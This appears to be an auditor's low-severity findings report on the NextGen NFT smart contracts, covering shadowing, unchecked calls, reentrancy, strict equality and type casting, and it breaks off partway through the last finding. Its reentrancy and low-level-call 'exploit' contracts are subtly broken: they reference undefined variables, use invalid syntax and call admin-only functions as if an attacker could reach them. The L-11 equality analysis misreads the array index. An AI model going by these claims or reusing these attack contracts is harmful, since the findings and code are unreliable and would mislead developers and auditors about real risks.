## [L-01] Shadowing local variables
## Impact
Detection of shadowing using local variables.

Shadowing using local variables in Solidity occurs when a local variable in a function has the same name as a state variable. When this happens, the local variable takes precedence over the state variable within the scope of the function, effectively "shadowing" it. This can lead to bugs if the programmer intended to interact with the state variable but inadvertently interacted with the local variable instead. It's generally recommended to avoid variable shadowing to prevent such confusion and potential errors.

**Locations** 
## 1
```txt
https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol
```
Variables shadowing are:
symbol
name
```sol
NextGenCore.constructor(string,string,address).symbol (smart-contracts/NextGenCore.sol#108) shadows:
- ERC721.symbol() (smart-contracts/ERC721.sol#87-89) (function)
- IERC721Metadata.symbol() (smart-contracts/IERC721Metadata.sol#22) (function)
`constructor(string memory name, string memory `symbol`, address _adminsContract) ERC721(name, symbol) {`
```
```sol
NextGenCore.constructor(string,string,address).name (smart-contracts/NextGenCore.sol#108) shadows:
- ERC721.name() (smart-contracts/ERC721.sol#80-82) (function)
- IERC721Metadata.name() (smart-contracts/IERC721Metadata.sol#17) (function)
`constructor(string memory `name`, string memory symbol, address _adminsContract) ERC721(name, symbol) {`
```
## 2
```txt
https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerVRF.sol
```
Variables shadowing are:
vrfCoordinator
```sol
NextGenRandomizerVRF.constructor(uint64,address,address,address).vrfCoordinator (smart-contracts/RandomizerVRF.sol#39) shadows:
- VRFConsumerBaseV2.vrfCoordinator (smart-contracts/VRFConsumerBaseV2.sol#99) (state variable)
    `constructor(uint64 subscriptionId, address `vrfCoordinator`, address _gencore, address _adminsContract) VRFConsumerBaseV2(vrfCoordinator) {`
```
## Recommendation
Rename the local variables that shadow another component.
## [L-02] Return value of low level call not checked
## Impact
The return value of low level call is not checked.
If the msg.sender is a contract and its receive() function has the potential to revert, the code payable(admin).call{value: balance}(""); could potentially return a false result, which is not being verified. As a result, the calling functions may exit without successfully returning ethers to senders.
The emergencyWithdraw function does not check the return value of low-level calls. 
This can lock Ether in the contract if the call fails or may compromise the contract if the ownership is being changed.
The following call was detected without return value validations in the emergencyWithdraw function.
`(bool success, ) = payable(admin).call{value: balance}("");`
## Proof of Concept
**Vulnerable emergencyWithdraw function**
```sol
// Ln 461-466
    function emergencyWithdraw() public FunctionAdminRequired(this.emergencyWithdraw.selector) {
        uint balance = address(this).balance;
        address admin = adminsContract.owner();
        (bool success, ) = payable(admin).call{value: balance}("");
        emit Withdraw(msg.sender, success, balance);
    }
```
**Vulnerable code snippet**
```sol
// Ln 464
(bool success, ) = payable(admin).call{value: balance}("");
```
**Exploit low level call on emergencyWithdraw function**
```sol
// SPDX-License-Identifier: MIT

pragma solidity >=0.8.19;

import "./MinterContract.sol";

contract tMinterContract {

   MinterContract public x1;

   constructor(MinterContract _x1) {

      x1 = MinterContract(_x1);
  
   }

   function testLowCal() public payable {

      x1.emergencyWithdraw{value: 3 ether}();

   }

   receive() external payable {}
      
   } 
```
## Tools Used
VS Code.
## Recommended Mitigation Steps
It's recommended to check the return value to be true or just use OpenZeppelin Address library sendValue() function for ether transfer. 
See https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.9.3/contracts/utils/Address.sol#L64 .
Ensure return value is checked using conditional statements for low-level calls. 
Conditional statements like `require()`.
## [L-03] Return value of low level call not checked
## Impact
The return value of low level call is not checked.
If the msg.sender is a contract and its receive() function has the potential to revert, the code payable(admin).call{value: balance}(""); could potentially return a false result, which is not being verified. As a result, the calling functions may exit without successfully returning ethers to senders.
The emergencyWithdraw function does not check the return value of low-level calls. 
This can lock Ether in the contract if the call fails or may compromise the contract if the ownership is being changed.
The following call was detected without return value validations in the emergencyWithdraw function.
`(bool success, ) = payable(admin).call{value: balance}("");`
## Proof of Concept
**Vulnerable emergencyWithdraw function**
```sol
// Ln 79-84
    function emergencyWithdraw() public FunctionAdminRequired(this.emergencyWithdraw.selector) {
        uint balance = address(this).balance;
        address admin = adminsContract.owner();
        (bool success, ) = payable(admin).call{value: balance}("");
        emit Withdraw(msg.sender, success, balance);
    }
```
**Vulnerable code snippet**
```sol
// Ln 82
        (bool success, ) = payable(admin).call{value: balance}("");
```
**Exploit low level call on emergencyWithdraw function**
```sol
// SPDX-License-Identifier: MIT

pragma solidity >=0.8.19;

import "./RandomizerRNG.sol";

contract tRandomizerRNG {

   RandomizerRNG public x1;

   constructor(RandomizerRNG _x1) {

      x1 = RandomizerRNG(_x1);
  
   }

   function testLowCal() public payable {

      x1.emergencyWithdraw{value: 3 ether}();

   }

   receive() external payable {}
      
   } 
```
## Tools Used
VS Code.
## Recommended Mitigation Steps
It's recommended to check the return value to be true or just use OpenZeppelin Address library sendValue() function for ether transfer. 
See https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.9.3/contracts/utils/Address.sol#L64 .
Ensure return value is checked using conditional statements for low-level calls. 
Conditional statements like `require()`.
## [L-04] Reentrancy flaw
## Impact
The reentrancy vulnerability uses the attack contract to call into the victim contract several times before the victim contract's balance updates.
Hence allowing the attacker to withdraw e.g. 2 ether when they only deposited 1 ether.
Which means double entry counting duplicate withdrawals for only one genuine withdrawal.
## Proof of Concept
**Vulnerable burnOrSwapExternalToMint function to reentrancy**
```sol
// Ln 326-365
    function burnOrSwapExternalToMint(address _erc721Collection, uint256 _burnCollectionID, uint256 _tokenId, uint256 _mintCollectionID, string memory _tokenData, bytes32[] calldata merkleProof, uint256 _saltfun_o) public payable {
        bytes32 externalCol = keccak256(abi.encodePacked(_erc721Collection,_burnCollectionID));
        require(burnExternalToMintCollections[externalCol][_mintCollectionID] == true, "Initialize external burn");
        require(setMintingCosts[_mintCollectionID] == true, "Set Minting Costs");
        address ownerOfToken = IERC721(_erc721Collection).ownerOf(_tokenId);
        if (msg.sender != ownerOfToken) {
            bool isAllowedToMint;
            isAllowedToMint = dmc.retrieveGlobalStatusOfDelegation(ownerOfToken, 0x8888888888888888888888888888888888888888, msg.sender, 1) || dmc.retrieveGlobalStatusOfDelegation(ownerOfToken, 0x8888888888888888888888888888888888888888, msg.sender, 2);
            if (isAllowedToMint == false) {
            isAllowedToMint = dmc.retrieveGlobalStatusOfDelegation(ownerOfToken, _erc721Collection, msg.sender, 1) || dmc.retrieveGlobalStatusOfDelegation(ownerOfToken, _erc721Collection, msg.sender, 2);    
            }
            require(isAllowedToMint == true, "No delegation");
        }
        require(_tokenId >= burnOrSwapIds[externalCol][0] && _tokenId <= burnOrSwapIds[externalCol][1], "Token id does not match");
        IERC721(_erc721Collection).safeTransferFrom(ownerOfToken, burnOrSwapAddress[externalCol], _tokenId);
        uint256 col = _mintCollectionID;
        address mintingAddress;
        uint256 phase;
        string memory tokData = _tokenData;
        if (block.timestamp >= collectionPhases[col].allowlistStartTime && block.timestamp <= collectionPhases[col].allowlistEndTime) {
            phase = 1;
            bytes32 node;
            node = keccak256(abi.encodePacked(_tokenId, tokData));
            mintingAddress = ownerOfToken;
            require(MerkleProof.verifyCalldata(merkleProof, collectionPhases[col].merkleRoot, node), 'invalid proof');            
        } else if (block.timestamp >= collectionPhases[col].publicStartTime && block.timestamp <= collectionPhases[col].publicEndTime) {
            phase = 2;
            mintingAddress = ownerOfToken;
            tokData = '"public"';
        } else {
            revert("No minting");
        }
        uint256 collectionTokenMintIndex;
        collectionTokenMintIndex = gencore.viewTokensIndexMin(col) + gencore.viewCirSupply(col);
        require(collectionTokenMintIndex <= gencore.viewTokensIndexMax(col), "No supply");
        require(msg.value >= (getPrice(col) * 1), "Wrong ETH");
        uint256 mintIndex = gencore.viewTokensIndexMin(col) + gencore.viewCirSupply(col);
        gencore.mint(mintIndex, mintingAddress, ownerOfToken, tokData, _saltfun_o, col, phase);
        collectionTotalAmount[col] = collectionTotalAmount[col] + msg.value;
    }
```
**Vulnerable payArtist function to reentrancy**
```sol
// 415-444
    function payArtist(uint256 _collectionID, address _team1, address _team2, uint256 _teamperc1, uint256 _teamperc2) public FunctionAdminRequired(this.payArtist.selector) {
        require(collectionArtistPrimaryAddresses[_collectionID].status == true, "Accept Royalties");
        require(collectionTotalAmount[_collectionID] > 0, "Collection Balance must be grater than 0");
        require(collectionRoyaltiesPrimarySplits[_collectionID].artistPercentage + _teamperc1 + _teamperc2 == 100, "Change percentages");
        uint256 royalties = collectionTotalAmount[_collectionID];
        collectionTotalAmount[_collectionID] = 0;
        address tm1 = _team1;
        address tm2 = _team2;
        uint256 colId = _collectionID;
        uint256 artistRoyalties1;
        uint256 artistRoyalties2;
        uint256 artistRoyalties3;
        uint256 teamRoyalties1;
        uint256 teamRoyalties2;
        artistRoyalties1 = royalties * collectionArtistPrimaryAddresses[colId].add1Percentage / 100;
        artistRoyalties2 = royalties * collectionArtistPrimaryAddresses[colId].add2Percentage / 100;
        artistRoyalties3 = royalties * collectionArtistPrimaryAddresses[colId].add3Percentage / 100;
        teamRoyalties1 = royalties * _teamperc1 / 100;
        teamRoyalties2 = royalties * _teamperc2 / 100;
        (bool success1, ) = payable(collectionArtistPrimaryAddresses[colId].primaryAdd1).call{value: artistRoyalties1}("");
        (bool success2, ) = payable(collectionArtistPrimaryAddresses[colId].primaryAdd2).call{value: artistRoyalties2}("");
        (bool success3, ) = payable(collectionArtistPrimaryAddresses[colId].primaryAdd3).call{value: artistRoyalties3}("");
        (bool success4, ) = payable(tm1).call{value: teamRoyalties1}("");
        (bool success5, ) = payable(tm2).call{value: teamRoyalties2}("");
        emit PayArtist(collectionArtistPrimaryAddresses[colId].primaryAdd1, success1, artistRoyalties1);
        emit PayArtist(collectionArtistPrimaryAddresses[colId].primaryAdd2, success2, artistRoyalties2);
        emit PayArtist(collectionArtistPrimaryAddresses[colId].primaryAdd3, success3, artistRoyalties3);
        emit PayTeam(tm1, success4, teamRoyalties1);
        emit PayTeam(tm2, success5, teamRoyalties2);
    }
```
**Vulnerable updateAdminContract function to reentrancy**
```sol
// 454-457
    function updateAdminContract(address _newadminsContract) public FunctionAdminRequired(this.updateAdminContract.selector) {
        require(INextGenAdmins(_newadminsContract).isAdminContract() == true, "Contract is not Admin");
        adminsContract = INextGenAdmins(_newadminsContract);
    }
```
**Vulnerable emergencyWithdraw function to reentrancy**
```sol
// Ln 461-466
    function emergencyWithdraw() public FunctionAdminRequired(this.emergencyWithdraw.selector) {
        uint balance = address(this).balance;
        address admin = adminsContract.owner();
        (bool success, ) = payable(admin).call{value: balance}("");
        emit Withdraw(msg.sender, success, balance);
    }
```
**Exploit Reentrancy**
```sol
// SPDX-License-Identifier: MIT

pragma solidity >=0.8.19;

import "./MinterContract.sol";

contract tMinterContract {

   MinterContract public x1;

   constructor(MinterContract _x1) {

      x1 = MinterContract(_x1);

   }

   function testRenterD() public payable {
      
      string memory tokenData = string("0x1e18");
      bytes32[] calldata merkleProof = new bytes32[1]();
      merkleProof[0] = bytes32(0x3);      

      x1.burnOrSwapExternalToMint(address(_x1), 
         uint256(2), 
         uint256(24), 
         uint256(34), 
         tokenData, 
         merkleProof, 
         uint256(7));

      x1.payArtist{value: 2 ether}(uint256(24), 
         address(_x1), 
         address(_x1), 
         uint256(10), 
         uint256(20));

      x1.updateAdminContract(address(_x1));

      x1.emergencyWithdraw{value: 2 ether}();

   }

   receive() external payable {

      msg.sender.transfer(payable(address(_x1)).balance);

   }
   
   }
```
## Tools Used
VS Code.
## Recommended Mitigation Steps
All functions that are not internal and are making a call should have a reentrancy guard added to them.
Checks-Effects-Interactions should be applied to the functions. 
Balance updates should be made at the beginning of the call.
The actual call should be made at the end of the function.
So that the balance is already updated first and reentrancy is not possible.
## [L-06] Reentrancy in NextGen Contract
## Impact
The reentrancy vulnerability uses the attack contract to call into the victim contract several times before the victim contract's balance updates.
Hence allowing the attacker to withdraw e.g. 2 ether when they only deposited 1 ether.
Which means double entry counting duplicate withdrawals for only one genuine withdrawal.
## Proof of Concept
**Vulnerable addRandomizer function to reentrancy**
```sol
// Ln 170-174
    function addRandomizer(uint256 _collectionID, address _randomizerContract) public FunctionAdminRequired(this.addRandomizer.selector) {
        require(IRandomizer(_randomizerContract).isRandomizerContract() == true, "Contract is not Randomizer");
        collectionAdditionalData[_collectionID].randomizerContract = _randomizerContract;
        collectionAdditionalData[_collectionID].randomizer = IRandomizer(_randomizerContract);
    }
```
**Vulnerable setFinalSupply function to reentrancy**
```sol
// Ln 307-311
    function setFinalSupply(uint256 _collectionID) public FunctionAdminRequired(this.setFinalSupply.selector) {
        require (block.timestamp > IMinterContract(minterContract).getEndTime(_collectionID) + collectionAdditionalData[_collectionID].setFinalSupplyTimeAfterMint, "Time has not passed");
        collectionAdditionalData[_collectionID].collectionTotalSupply = collectionAdditionalData[_collectionID].collectionCirculationSupply;
        collectionAdditionalData[_collectionID].reservedMaxTokensIndex = (_collectionID * 10000000000) + collectionAdditionalData[_collectionID].collectionTotalSupply - 1;
    }
```
**Vulnerable addMinterContract function to reentrancy**
```sol
// Ln 315-318
    function addMinterContract(address _minterContract) public FunctionAdminRequired(this.addMinterContract.selector) { 
        require(IMinterContract(_minterContract).isMinterContract() == true, "Contract is not Minter");
        minterContract = _minterContract;
    }
```
**Vulnerable updateAdminContract function to reentrancy**
```sol
// Ln 322-325
    function updateAdminContract(address _newadminsContract) public FunctionAdminRequired(this.updateAdminContract.selector) {
        require(INextGenAdmins(_newadminsContract).isAdminContract() == true, "Contract is not Admin");
        adminsContract = INextGenAdmins(_newadminsContract);
    }
```
**Exploit Reentrancy**
```sol
// SPDX-License-Identifier: MIT

pragma solidity >=0.8.19;

import "./NextGenCore.sol";

contract tNextGenCore {

   NextGenCore public x1;

   constructor(NextGenCore _x1) {

      x1 = NextGenCore(_x1);

   }

   function testReenterC() public payable {

      x1.addRandomizer(uint256(2),address(_x1));
      x1.setFinalSupply(uint256(2));
      x1.addMinterContract(address(_x1));
      x1.updateAdminContract(address(_x1));

   }

   receive() external payable {

      msg.sender.transfer(payable(address(_x1)).balance);

   }

   }
```
## Tools Used
VS Code.
## Recommended Mitigation Steps
All functions that are not internal and are making a call should have a reentrancy guard added to them.
Checks-Effects-Interactions should be applied to the functions. 
Balance updates should be made at the beginning of the call.
The actual call should be made at the end of the function.
So that the balance is already updated first and reentrancy is not possible.
## [L-07] Reentrancy in RandomizerVRF contract
## Impact
The reentrancy vulnerability uses the attack contract to call into the victim contract several times before the victim contract's balance updates.
Hence allowing the attacker to withdraw e.g. 2 ether when they only deposited 1 ether.
Which means double entry counting duplicate withdrawals for only one genuine withdrawal.
## Proof of Concept
**Vulnerable updateAdminContract function to reentrancy**
```sol
// Ln 94-97
    function updateAdminContract(address _newadminsContract) public FunctionAdminRequired(this.updateAdminContract.selector) {
        require(INextGenAdmins(_newadminsContract).isAdminContract() == true, "Contract is not Admin");
        adminsContract = INextGenAdmins(_newadminsContract);
    }
```
**Exploit Reentrancy**
```sol
// SPDX-License-Identifier: MIT

pragma solidity >=0.8.19;

import "./RandomizerVRF.sol";

contract tRandomizerVRF {

   RandomizerVRF public x1;

   constructor(RandomizerVRF _x1) {

      x1 = RandomizerVRF(_x1);

   }


   function testRenterS() public payable {

      x1.updateAdminContract(address(_x1));

   }

   receive() external payable {

      msg.sender.transfer(payable(address(_x1)).balance);

   }

   } 
```
## Tools Used
VS Code.
## Recommended Mitigation Steps
All functions that are not internal and are making a call should have a reentrancy guard added to them.
Checks-Effects-Interactions should be applied to the functions. 
Balance updates should be made at the beginning of the call.
The actual call should be made at the end of the function.
So that the balance is already updated first and reentrancy is not possible.
## [L-09] Reentrnacy in RandomizerRNG contract
## Impact
The reentrancy vulnerability uses the attack contract to call into the victim contract several times before the victim contract's balance updates.
Hence allowing the attacker to withdraw e.g. 2 ether when they only deposited 1 ether.
Which means double entry counting duplicate withdrawals for only one genuine withdrawal.
## Proof of Concept

**Vulnerable updateAdminContract function to reentrancy**
```sol
// Ln 61-64
    function updateAdminContract(address _newadminsContract) public FunctionAdminRequired(this.updateAdminContract.selector) {
        require(INextGenAdmins(_newadminsContract).isAdminContract() == true, "Contract is not Admin");
        adminsContract = INextGenAdmins(_newadminsContract);
    }
```
**Vulnerable emergencyWithdraw function to reentrancy**
```sol
// Ln 79-84
    function emergencyWithdraw() public FunctionAdminRequired(this.emergencyWithdraw.selector) {
        uint balance = address(this).balance;
        address admin = adminsContract.owner();
        (bool success, ) = payable(admin).call{value: balance}("");
        emit Withdraw(msg.sender, success, balance);
    }
```
**Exploit Reentrancy**
```sol
// SPDX-License-Identifier: MIT

pragma solidity >=0.8.19;

import "./RandomizerRNG.sol";

contract tRandomizerRNG {

   RandomizerRNG public x1;

   constructor(RandomizerRNG _x1) {

      x1 = RandomizerRNG(_x1);

   }

   function testReenEnter() public payable {

      x1.updateAdminContract(address(_x1));
      x1.emergencyWithdraw{value: 2 ether}();

   }

   receive() external payable {

      msg.sender.transfer(payable(address(_x1)).balance);

   }

   }
```
## Tools Used
VS Code.
## Recommended Mitigation Steps
All functions that are not internal and are making a call should have a reentrancy guard added to them.
Checks-Effects-Interactions should be applied to the functions. 
Balance updates should be made at the beginning of the call.
The actual call should be made at the end of the function.
So that the balance is already updated first and reentrancy is not possible.
## [L-10] Reentrancy in auction demo contract
## Impact
The reentrancy vulnerability uses the attack contract to call into the victim contract several times before the victim contract's balance updates.
Hence allowing the attacker to withdraw e.g. 2 ether when they only deposited 1 ether.
Which means double entry counting duplicate withdrawals for only one genuine withdrawal.
## Proof of Concept
**Vulnerable claimAuction function to reentrancy**
```sol
// Ln 104-120
    function claimAuction(uint256 _tokenid) public WinnerOrAdminRequired(_tokenid,this.claimAuction.selector){
        require(block.timestamp >= minter.getAuctionEndTime(_tokenid) && auctionClaim[_tokenid] == false && minter.getAuctionStatus(_tokenid) == true);
        auctionClaim[_tokenid] = true;
        uint256 highestBid = returnHighestBid(_tokenid);
        address ownerOfToken = IERC721(gencore).ownerOf(_tokenid);
        address highestBidder = returnHighestBidder(_tokenid);
        for (uint256 i=0; i< auctionInfoData[_tokenid].length; i ++) {
            if (auctionInfoData[_tokenid][i].bidder == highestBidder && auctionInfoData[_tokenid][i].bid == highestBid && auctionInfoData[_tokenid][i].status == true) {
                IERC721(gencore).safeTransferFrom(ownerOfToken, highestBidder, _tokenid);
                (bool success, ) = payable(owner()).call{value: highestBid}("");
                emit ClaimAuction(owner(), _tokenid, success, highestBid);
            } else if (auctionInfoData[_tokenid][i].status == true) {
                (bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}("");
                emit Refund(auctionInfoData[_tokenid][i].bidder, _tokenid, success, highestBid);
            } else {}
        }
    }
```
**Vulnerable cancelBid function to reentrancy**
```sol
// Ln 124-130
    function cancelBid(uint256 _tokenid, uint256 index) public {
        require(block.timestamp <= minter.getAuctionEndTime(_tokenid), "Auction ended");
        require(auctionInfoData[_tokenid][index].bidder == msg.sender && auctionInfoData[_tokenid][index].status == true);
        auctionInfoData[_tokenid][index].status = false;
        (bool success, ) = payable(auctionInfoData[_tokenid][index].bidder).call{value: auctionInfoData[_tokenid][index].bid}("");
        emit CancelBid(msg.sender, _tokenid, index, success, auctionInfoData[_tokenid][index].bid);
    }
```
**Vulnerable cancelAllBids function to reentrancy**
```sol
// Ln 134-143
    function cancelAllBids(uint256 _tokenid) public {
        require(block.timestamp <= minter.getAuctionEndTime(_tokenid), "Auction ended");
        for (uint256 i=0; i<auctionInfoData[_tokenid].length; i++) {
            if (auctionInfoData[_tokenid][i].bidder == msg.sender && auctionInfoData[_tokenid][i].status == true) {
                auctionInfoData[_tokenid][i].status = false;
                (bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}("");
                emit CancelBid(msg.sender, _tokenid, i, success, auctionInfoData[_tokenid][i].bid);
            } else {}
        }
    }
```
**Exploit Reentrancy**
```sol
// SPDX-License-Identifier: MIT

pragma solidity >=0.8.19;

import "./AuctionDemo.sol";

contract tAuctionDemo {

   AuctionDemo public x1;

   constructor(AuctionDemo _x1) {

      x1 = AuctionDemo(_x1);

   }

   function testReen() public payable {
      x1.claimAuction{value: 2 ether}(uint256(24));
      x1.cancelBid{value: 2 ether}(uint256(24), uint256(1));
      x1.cancelAllBids{value: 2 ether}(uint256(24));
   }
   
   receive() external payable {
    
      msg.sender.transfer(payable(address(_x1)).balance);

   }

   }
```
## Tools Used
VS Code.
## Recommended Mitigation Steps
All functions that are not internal and are making a call should have a reentrancy guard added to them.
Checks-Effects-Interactions should be applied to the functions. 
Balance updates should be made at the beginning of the call.
The actual call should be made at the end of the function.
So that the balance is already updated first and reentrancy is not possible.
## [L-11] Incorrect equality in XRandoms contract
## Impact
Use of strict equalities that can be easily manipulated by an attacker.
Dangerous strict equality is where the use of strict equality (==) for comparison may lead to unexpected or potentially unsafe behaviour due to issues like type conversions, precision, or external input. 
## Proof of Concept
Here is a Proof of Concept (POC) for the incorrect equality in the getWord function:
```sol
pragma solidity ^0.8.19;

contract TestRandomPool {
    randomPool rp = new randomPool();

    function testGetWord() public {
        // This will return the first word in the list, "Acai"
        string memory word1 = rp.getWord(0);
        assert(keccak256(abi.encodePacked(word1)) == keccak256(abi.encodePacked("Acai")));

        // This will return the second word in the list, "Ackee"
        string memory word2 = rp.getWord(1);
        assert(keccak256(abi.encodePacked(word2)) == keccak256(abi.encodePacked("Ackee")));

        // This will return the first word in the list, "Acai", due to incorrect equality
        string memory word3 = rp.getWord(2);
        assert(keccak256(abi.encodePacked(word3)) == keccak256(abi.encodePacked("Acai")));
    }
}
```
In the getWord function, the id is decremented by 1 when it is not equal to 0. 
This means that when id is 2, it will return the word at index 1, which is "Acai" instead of "Apple". 
This is due to the incorrect equality id == 0.
**Location**
```sol
randomPool.getWord(uint256) (smart-contracts/XRandoms.sol#15-33) uses a dangerous strict equality:
- id == 0 (smart-contracts/XRandoms.sol#28)
```
**Vulnerable line of code**
```sol
// Ln 28
        if (id==0) {
```
**Vulnerable getWords function**
```sol
Ln 15-33
    function getWord(uint256 id) private pure returns (string memory) {
        
        // array storing the words list
        string[100] memory wordsList = ["Acai", "Ackee", "Apple", "Apricot", "Avocado", "Babaco", "Banana", "Bilberry", "Blackberry", "Blackcurrant", "Blood Orange", 
        "Blueberry", "Boysenberry", "Breadfruit", "Brush Cherry", "Canary Melon", "Cantaloupe", "Carambola", "Casaba Melon", "Cherimoya", "Cherry", "Clementine", 
        "Cloudberry", "Coconut", "Cranberry", "Crenshaw Melon", "Cucumber", "Currant", "Curry Berry", "Custard Apple", "Damson Plum", "Date", "Dragonfruit", "Durian", 
        "Eggplant", "Elderberry", "Feijoa", "Finger Lime", "Fig", "Gooseberry", "Grapes", "Grapefruit", "Guava", "Honeydew Melon", "Huckleberry", "Italian Prune Plum", 
        "Jackfruit", "Java Plum", "Jujube", "Kaffir Lime", "Kiwi", "Kumquat", "Lemon", "Lime", "Loganberry", "Longan", "Loquat", "Lychee", "Mammee", "Mandarin", "Mango", 
        "Mangosteen", "Mulberry", "Nance", "Nectarine", "Noni", "Olive", "Orange", "Papaya", "Passion fruit", "Pawpaw", "Peach", "Pear", "Persimmon", "Pineapple", 
        "Plantain", "Plum", "Pomegranate", "Pomelo", "Prickly Pear", "Pulasan", "Quine", "Rambutan", "Raspberries", "Rhubarb", "Rose Apple", "Sapodilla", "Satsuma", 
        "Soursop", "Star Apple", "Star Fruit", "Strawberry", "Sugar Apple", "Tamarillo", "Tamarind", "Tangelo", "Tangerine", "Ugli", "Velvet Apple", "Watermelon"];


        // returns a word based on index
        if (id==0) {
            return wordsList[id];
        } else {
            return wordsList[id - 1];
        }
        }
```
## Tools Used
VS Code.
## Recommended Mitigation Steps
Don't use strict equality to determine if an account has enough Ether or tokens.
## [L-12] Dubious type casting
## Impact
Dubious type casting from bytes to bytes32 in Solidity refers to a potentially unsafe conversion between these two data types.

In Solidity, bytes is a dynamically-sized byte array, while bytes32 is a fixed-size byte array of 32 bytes. 
When you cast bytes to bytes32, you're essentially trying to fit a potentially larger amount of data into a smaller container.

If the bytes array is larger than 32 bytes, the conversion will result in data loss as only the first 32 bytes will be kept and the rest will be discarded. 
This can lead to unexpected behavior and potential security vulnerabilities in your smart contract.

## Proof of Concept
**Vulnerable line of code**
```sol
// Ln 49
        gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[id]], requestToToken[id], bytes32(abi.encodePacked(numbers,requestToToken[id])));
```
**Vulnerable function fulfillRandomWords to type casting**
```sol
// Ln 48-50
    function fulfillRandomWords(uint256 id, uint256[] memory numbers) internal override {
        gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[id]], requestToToken[id], bytes32(abi.encodePacked(numbers,requestToToken[id])));
    }
```
The dubious type casting issue is related to the fulfillRandomWords function where bytes is being cast to bytes32. 
This can potentially lead to data loss if the size of the bytes exceeds 32 bytes. 
Here is a proof of concept (POC) that demonstrates this issue:
```sol
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.19;

contract POC {
    function dubiousTypeCast() public pure returns (bytes32) {
        uint256[] memory numbers = new uint256[](5);
        for (uint i = 0; i < 5; i++) {
            numbers[i] = i;
        }
        uint256 id = 123456789;
        bytes memory packed = abi.encodePacked(numbers, id);
        bytes32 result = bytes32(packed);
        return result;
    }
}
```
In this POC, we create an array of 5 uint256 numbers and an id. We then pack these into a bytes variable. 
Finally, we cast this bytes variable to bytes32 and return it. 
If you run this function, you will see that the returned bytes32 value is not the same as the original bytes value, demonstrating the potential for data loss due to the dubious type casting.
**Location**
```sol
Dubious typecast in NextGenRandomizerRNG.fulfillRandomWords(uint256,uint256[]) (smart-contracts/RandomizerRNG.sol#48-50):
bytes => bytes32 casting occurs in gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[id]],requestToToken[id],bytes32(abi.encodePacked(numbers,requestToToken[id]))) (smart-contracts/RandomizerRNG.sol#49)
```
## Tools Used
VS Code.
## Recommended Mitigation Steps
Use clear constants.
## [L-14] Dubious type casting
## Impact
Down data type casting from bytes to bytes32 in Solidity involves converting a larger data type (bytes) to a smaller data type (bytes32). 
This is done by taking the first 32 bytes of the larger data type and discarding the rest. 
However, this operation can be risky if not handled properly because any data beyond the first 32 bytes is permanently lost. 
In the code, this operation is not explicitly performed.

## Proof of Concept
The dubious typecast is the conversion from bytes to bytes32 in the fulfillRandomWords function. 
Here's a proof of concept (POC) that demonstrates the potential issue:
```sol
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.19;

contract POC {
    function dubiousTypecast() public pure returns (bytes32) {
        uint256[] memory randomWords = new uint256[](3);
        randomWords[0] = 1;
        randomWords[1] = 2;
        randomWords[2] = 3;
        uint256 tokenId = 123;

        bytes memory packed = abi.encodePacked(randomWords, tokenId);
        bytes32 result = bytes32(packed); // Dubious typecast

        return result;
    }
}
```
In this POC, randomWords is an array of uint256 and tokenId is a uint256. 
They are packed together into a bytes variable using abi.encodePacked. 
Then, a dubious typecast is performed to convert the bytes variable to bytes32.

The issue here is that bytes can be of any length, but bytes32 is always 32 bytes long. 
If the bytes variable is longer than 32 bytes, the conversion will truncate the data, leading to loss of information. 
If the bytes variable is shorter than 32 bytes, the conversion will pad the data with zeros, which might not be the intended behavior.

In the context of the NextGenRandomizerVRF contract, this dubious typecast could lead to incorrect token hashes being set in the gencoreContract, which could have serious implications depending on how these hashes are used in the rest of the contract.

**Locations**
```sol
Dubious typecast in NextGenRandomizerVRF.fulfillRandomWords(uint256,uint256[]) (smart-contracts/RandomizerVRF.sol#65-68):
bytes => bytes32 casting occurs in gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[_requestId]],requestToToken[_requestId],bytes32(abi.encodePacked(_randomWords,requestToToken[_requestId]))) (smart-contracts/RandomizerVRF.sol#66)
```
**Vulnerable fulfillRandomWords function**
```sol
// Ln 65-68
    function fulfillRandomWords(uint256 _requestId, uint256[] memory _randomWords) internal override {
        gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[_requestId]], requestToToken[_requestId], bytes32(abi.encodePacked(_randomWords,requestToToken[_requestId])));
        emit RequestFulfilled(_requestId, _randomWords);
    }
```
```sol
// Ln 66
        gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[_requestId]], requestToToken[_requestId], bytes32(abi.encodePacked(_randomWords,requestToToken[_requestId])));
```
## Tools Used
VS Code.
## Recommended Mitigation Steps
Use clear constants.
## [L-15] Controlled low level call
## Impact
The contract is using call() which is accepting address controlled by a user. 
This can have devastating effects on the contract as a call allows the contract to execute code belonging to other contracts but using it’s own storage. 
This can very easily lead to a loss of funds and compromise of the contract.

## Proof of Concept
**Vulnerable payArtist function**
```sol
// Ln 415-444
    function payArtist(uint256 _collectionID, address _team1, address _team2, uint256 _teamperc1, uint256 _teamperc2) public FunctionAdminRequired(this.payArtist.selector) {
        require(collectionArtistPrimaryAddresses[_collectionID].status == true, "Accept Royalties");
        require(collectionTotalAmount[_collectionID] > 0, "Collection Balance must be grater than 0");
        require(collectionRoyaltiesPrimarySplits[_collectionID].artistPercentage + _teamperc1 + _teamperc2 == 100, "Change percentages");
        uint256 royalties = collectionTotalAmount[_collectionID];
        collectionTotalAmount[_collectionID] = 0;
        address tm1 = _team1;
        address tm2 = _team2;
        uint256 colId = _collectionID;
        uint256 artistRoyalties1;
        uint256 artistRoyalties2;
        uint256 artistRoyalties3;
        uint256 teamRoyalties1;
        uint256 teamRoyalties2;
        artistRoyalties1 = royalties * collectionArtistPrimaryAddresses[colId].add1Percentage / 100;
        artistRoyalties2 = royalties * collectionArtistPrimaryAddresses[colId].add2Percentage / 100;
        artistRoyalties3 = royalties * collectionArtistPrimaryAddresses[colId].add3Percentage / 100;
        teamRoyalties1 = royalties * _teamperc1 / 100;
        teamRoyalties2 = royalties * _teamperc2 / 100;
